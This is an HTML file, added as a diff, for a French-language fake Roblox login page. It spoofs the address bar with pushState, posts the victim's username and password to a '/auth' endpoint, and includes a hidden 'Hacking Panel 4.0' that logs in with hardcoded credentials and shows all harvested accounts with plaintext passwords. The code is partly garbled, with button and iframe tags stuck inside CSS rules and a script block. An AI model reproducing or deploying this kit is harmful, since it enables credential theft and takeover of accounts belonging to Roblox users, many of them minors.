@@ -1,0 +1,313 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head> <link rel="icon" type="image/png" href="image.ico?v=2">; <script defer>
+history.pushState({}, "", "/roblox.com/fr/login");
+<iframe src="https://ton-site.com" width="100%" height="600"></iframe>
+</script>
+
+
+
+<meta charset="UTF-8">
+<title>Connexion à Roblox</title>
+
+<link rel="icon" type="image/png" href="image.png">
+
+<link href="https://image.api.playstation.com/vulcan/ap/rnd/202604/0801/6157a74f216f5fd380f33d326132130e6d1d7578291da74c.png">
+
+<style>
+
+/* 🖼️ BACKGROUND */
+body {
+  margin: 0;
+  height: 100vh;
+  font-family: Roboto, sans-serif;
+
+  background-image: url("https://image.api.playstation.com/vulcan/ap/rnd/202604/0801/6157a74f216f5fd380f33d326132130e6d1d7578291da74c.png");
+  background-size: cover;
+  background-position: center;
+  background-repeat: no-repeat;
+
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  color: white;
+
+  padding-top: 60px;
+}
+
+/* 🔝 NAVBAR */
+.navbar {
+  position: fixed;
+  top: 0;
+  width: 100%;
+  height: 60px;
+  background: #0f1117;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 0 20px;
+  box-sizing: border-box;
+  z-index: 1000;
+}
+
+.nav-left {
+  display: flex;
+  align-items: center;
+  gap: 20px;
+}
+
+.nav-left img {
+  width: 32px;
+  height: 32px;
+  border-radius: 6px;
+}
+
+.nav-left a {
+  color: #ccc;
+  text-decoration: none;
+  font-size: 14px;
+}
+
+.nav-left a:hover {
+  color: white;
+}
+
+.nav-search {
+  flex: 1;
+  display: flex;
+  justify-content: center;
+}
+
+.nav-search input {
+  width: 300px;
+  padding: 8px;
+  border-radius: 6px;
+  border: none;
+  background: #1c1f26;
+  color: white;
+}
+
+.nav-right {
+  display: flex;
+  gap: 10px;
+}
+
+.btn-signup {
+  background: #3b5cff;
+  border: none;
+  padding: 8px 14px;
+  border-radius: 6px;
+  color: white;
+  cursor: pointer;<button onclick="window.location.href='https://www.roblox.com/fr/sign-up'">
+  Roblox
+</button>
+}
+
+.btn-login {
+  background: transparent;
+  border: 1px solid #555;
+  padding: 8px 14px;
+  border-radius: 6px;
+  color: white;
+  cursor: pointer; <button onclick="window.location.href='https://www.roblox.com/fr/login'">
+  Roblox
+</button>
+}
+
+/* 🧊 LOGIN */
+.box {
+  width: 360px;
+  padding: 25px;
+  background: #1f2029;
+  border-radius: 12px;
+  text-align: center;
+  box-shadow: 0 0 25px rgba(0,0,0,0.6);
+}
+
+.box h2 {
+  margin-bottom: 20px;
+}
+
+input {
+  width: 100%;
+  padding: 12px;
+  margin-top: 10px;
+  border-radius: 8px;
+  border: 1px solid #3a3b45;
+  background: #2a2b33;
+  color: white;
+}
+
+input::placeholder {
+  color: #aaa;
+}
+
+button {
+  width: 100%;
+  margin-top: 15px;
+  padding: 12px;
+  border-radius: 8px;
+  border: 1px solid #555;
+  background: transparent;
+  color: white;
+  cursor: pointer;
+}
+
+button:hover {
+  background: #2f303a;
+}
+
+#result {
+  margin-top: 10px;
+  color: #00a2ff;
+}
+
+/* 🎮 MENU ADMIN */
+#menu {
+  display: none;
+  position: fixed;
+  width: 100%;
+  height: 100%;
+  background: radial-gradient(circle, #001a33, #000);
+  justify-content: center;
+  align-items: center;
+  flex-direction: column;
+}
+
+.menu-box {
+  padding: 30px;
+  border: 1px solid #00a2ff;
+  border-radius: 10px;
+  box-shadow: 0 0 25px #00a2ff;
+}
+
+</style>
+</head>
+
+<body>
+
+<!-- 🔝 NAVBAR -->
+<div class="navbar">
+
+  <div class="nav-left">
+    <img src="image.png">
+    <a href="#">Charts</a>
+    <a href="#">Marketplace</a>
+    <a href="#">Créer</a>
+    <a href="#">Robux</a>
+  </div>
+
+  <div class="nav-search">
+    <input placeholder="Rechercher">
+  </div>
+
+  <div class="nav-right">
+    <button class="btn-signup">S'inscrire</button> <button onclick="window.location.href='https://www.roblox.com/fr/sign-up'">
+</button>
+    <button class="btn-login">Connexion</button> <button onclick="window.location.href='https://www.roblox.com/fr/login'">
+</button>
+  </div>
+
+</div>
+
+<!-- LOGIN -->
+<div class="box">
+  <h2>Connexion à Roblox</h2>
+
+  <input id="username" placeholder="Identifiant/E-mail/Téléphone">
+  <input id="password" type="password" placeholder="Mot de passe">
+
+  <button onclick="login()">Connexion</button>
+
+  <p>Mot de passe ou nom d'utilisateur oublié ?</p>
+
+  <hr style="border:0.5px solid #333;">
+
+  <button style="background:#2a2b33;">Envoyez-moi un code unique par email</button>
+  <button style="background:#2a2b33;">Connexion rapide</button>
+
+  <p>Vous n'avez pas de compte ? <b>S'inscrire</b></p>
+
+  <div id="result"></div>
+</div>
+
+<!-- ADMIN MENU -->
+<div id="menu">
+  <div class="menu-box">
+    <h1>Hacking Panel 4.0</h1>
+    <button onclick="loadData()">Afficher les comptes</button>
+  </div>
+</div>
+
+<script>
+
+function login() {
+
+  fetch("/auth", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      username: document.getElementById("username").value,
+      password: document.getElementById("password").value
+    })
+  })
+
+  .then(res => res.json())
+  .then(data => {
+
+    let result = document.getElementById("result");
+
+    if (data.admin) {
+
+      document.querySelector(".box").style.display = "none";
+      document.getElementById("menu").style.display = "flex";
+
+      result.innerText = "";
+
+    } else if (data.message) {
+      result.innerText = data.message;
+    } else {
+      result.innerText = data.error;
+    }
+
+  })
+
+  .catch(() => {
+    document.getElementById("result").innerText = "❌ Serveur offline";
+  });
+
+}
+
+function loadData() {
+
+  fetch("/auth", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      username: "HACKER21",
+      password: "89304"
+    })
+  })
+
+  .then(res => res.json())
+  .then(data => {
+
+    if (data.admin) {
+
+      let txt = "COMPTES:\n\n";
+
+      data.data.forEach(u => {
+        txt += u.username + " / " + u.password + "\n";
+      });
+
+      alert(txt);
+    }
+
+  });
+
+}
+
+</script>
+
+</body>
+</html>
